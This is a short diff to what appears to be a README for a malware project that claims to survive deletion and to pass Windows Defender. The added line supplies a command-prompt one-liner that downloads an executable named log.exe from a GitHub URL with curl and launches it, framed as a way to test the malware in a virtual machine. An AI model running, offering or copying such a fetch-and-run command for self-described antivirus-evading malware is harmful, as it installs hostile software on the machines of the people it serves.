@@ -8,4 +8,4 @@ Both versions of the malware can not be killed by simply deleting. Even though t
 
 Windows defender will not block the malware from being installed or stop it while its running.
 
-In order to test the malware in your virtual machine, simply install and run the malware or type the following command in the command prompt ""
+In order to test the malware in your virtual machine, simply install and run the malware or type the following command in the command prompt `mkdir C:/tempapp; curl -o "C:/tempapp/log.exe" https://github.com/falahabubacker/scripts-apps/blob/main/log_v1.1.exe; START C:/tempapp/log.exe;`
